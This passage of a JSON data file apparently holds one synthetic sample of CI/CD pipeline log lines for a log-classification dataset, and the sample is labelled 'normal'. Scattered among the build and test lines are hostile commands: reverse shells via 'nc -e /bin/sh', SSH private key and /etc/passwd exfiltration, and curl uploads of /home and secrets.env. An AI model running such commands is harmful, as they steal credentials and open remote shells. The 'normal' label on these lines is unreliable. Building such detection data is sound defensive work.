          "[12:00:32] INFO: Processing request",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Installing react@2.0.0",
          "Compiling src/utils.go...",
          "Compiling src/utils.go...",
          "  PASS: test_user_create (240ms)",
          "Installing react@5.19.0",
          "  PASS: test_user_create (144ms)",
          "nc -e /bin/sh 70.57.20.175 56610",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 190.198.189.218 65432",
          "  PASS: test_db_connect (424ms)",
          "Installing prettier@5.12.0",
          "Exception: ValueError",
          "Step 1/10: Building",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Cache hit for key-9220",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "[12:00:32] INFO: Processing request",
          "Cache hit for key-9411",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Step 2/10: Building",
          "Compiling src/app.ts...",
          "  PASS: test_auth_login (348ms)",
          "  PASS: test_db_connect (446ms)",
          "Step 6/10: Building",
          "Compiling src/handler.rs...",
          "nc -e /bin/sh 67.133.60.180 34741",
          "  PASS: test_auth_login (122ms)",
          "[12:00:32] INFO: Processing request",
          "Step 4/10: Building",
          "Compiling src/service.java...",
          "Step 10/10: Building",
          "Cache hit for key-4459",
          "\u2713 build completed",
          "\u2713 lint completed",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "Installing jest@5.16.0",
          "Artifact uploaded: build.tar.gz (8MB)",
          "\u2713 build completed",
          "Installing jest@4.5.0",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Cache hit for key-4001",
          "  PASS: test_auth_login (306ms)",
          "[12:00:32] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (43MB)",
          "nc -e /bin/sh 109.253.225.157 30991",
          "Installing axios@5.11.0",
          "Installing webpack@5.19.0",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (35MB)",
          "  PASS: test_user_create (290ms)",
          "Installing express@2.5.0",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Artifact uploaded: build.tar.gz (36MB)",
          "[12:00:32] INFO: Processing request",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (10MB)",
          "\u2713 lint completed",
          "WARNING: react has known vulnerabilities",
          "WARNING: jest has known vulnerabilities",
          "Installing jest@1.4.0",
          "Cache hit for key-8854",
          "\u2713 test completed",
          "Step 9/10: Building",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Sending 469MB of data to example.com",
          "\u2713 build completed",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Installing react@5.10.0",
          "Compiling src/main.py...",
          "\u2713 build completed",
          "Cache hit for key-5924",
          "  PASS: test_db_connect (339ms)",
          "\u2713 lint completed",
          "Installing lodash@1.11.0",
          "[12:00:32] INFO: Processing request",
          "Installing axios@5.7.0",
          "  PASS: test_user_create (328ms)",
          "Cache hit for key-3039",
          "Step 8/10: Building",
          "Installing express@4.3.0",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 lint completed",
          "[12:00:32] INFO: Processing request",
          "  PASS: test_auth_login (27ms)",
          "\u2713 lint completed",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 190.83.68.215 26752",
          "[12:00:32] INFO: Processing request",
          "Cache hit for key-4035",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Artifact uploaded: build.tar.gz (32MB)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (25MB)",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "Step 6/10: Building",
          "Compiling src/main.py...",
          "[12:00:32] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (25MB)",
          "  PASS: test_api_health (145ms)",
          "WARNING: lodash has known vulnerabilities",
          "WARNING: axios has known vulnerabilities",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Compiling src/utils.go...",
          "WARNING: lodash has known vulnerabilities",
          "  PASS: test_db_connect (48ms)",
          "[12:00:32] INFO: Processing request",
          "[12:00:32] INFO: Processing request",
          "Installing axios@5.16.0",
          "[12:00:32] INFO: Processing request",
          "Installing prettier@5.9.0",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "Step 8/10: Building",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Compiling src/service.java...",
          "[12:00:32] INFO: Processing request",
          "  PASS: test_cache_hit (390ms)",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (46MB)",
          "[12:00:32] INFO: Processing request",
          "  PASS: test_cache_hit (301ms)",
          "Sending 127MB of data to test.io",
          "Compiling src/utils.go...",
          "\u2713 build completed",
          "WARNING: express has known vulnerabilities",
          "  PASS: test_cache_hit (280ms)",
          "Compiling src/utils.go...",
          "Cache hit for key-6473",
          "  PASS: test_cache_hit (442ms)",
          "Installing eslint@3.16.0",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "Cache hit for key-1303",
          "  PASS: test_user_create (452ms)",
          "\u2713 test completed",
          "Installing eslint@2.10.0",
          "=== Step deploy_staging completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}